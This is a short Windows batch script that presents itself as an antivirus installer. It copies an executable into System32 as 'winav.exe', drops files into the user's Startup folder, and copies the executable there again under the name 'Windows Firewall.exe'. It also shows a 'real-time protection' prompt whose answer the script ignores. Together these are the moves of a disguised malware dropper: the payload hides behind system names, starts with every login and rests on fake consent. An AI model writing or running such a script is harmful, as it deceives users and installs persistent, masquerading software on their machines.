@echo off
copy /y C:\temp-avs\avs.exe C:\Windows\System32\winav.exe 
copy C:\temp-avs\avs.dat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\avs.dat"
echo.
ping localhost -n 10 >nul
rd /s /q C:\temp-avs
echo.
echo x=msgbox ("Do you want to enable real-time protection?" ,4+64, "Real Time Protection") > %temp%\temp.vbs
wscript %temp%\temp.vbs
rem WAIT UNTIL THE USER SAYS YES
del %temp%\temp.vbs
copy C:\Windows\system32\winav.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Firewall.exe"
echo.

REM EXIT

exit